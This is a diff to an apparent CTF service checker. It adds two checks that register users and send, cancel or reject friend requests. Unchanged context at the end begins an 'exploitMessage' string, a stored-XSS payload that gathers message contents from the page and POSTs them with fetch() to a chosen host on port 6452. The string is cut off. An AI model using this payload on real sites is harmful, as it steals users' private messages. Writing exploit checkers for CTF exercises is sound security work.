@@ -574,6 +574,36 @@ async def havoc6(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: C
     assert_equals(r.status_code, 302)
 
 
+@checker.havoc(7)
+async def havoc7(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    cookies, username = await register(task, client, secrets.token_hex(32), logger)
+    partnerCookies, partner = await register(task, client, secrets.token_hex(32), logger)
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookies)
+    assert_equals(r.status_code, 200)
+    assert_equals(r.text, "ok")
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'cancel'}, cookies=cookies)
+    assert_equals(r.status_code, 200)
+    assert_equals(r.text, "ok")
+
+
+@checker.havoc(8)
+async def havoc8(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    cookies, username = await register(task, client, secrets.token_hex(32), logger)
+    partnerCookies, partner = await register(task, client, secrets.token_hex(32), logger)
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookies)
+    assert_equals(r.status_code, 200)
+    assert_equals(r.text, "ok")
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'reject'}, cookies=partnerCookies)
+    assert_equals(r.status_code, 200)
+    assert_equals(r.text, "ok")
+
+
 exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                  "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                  " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
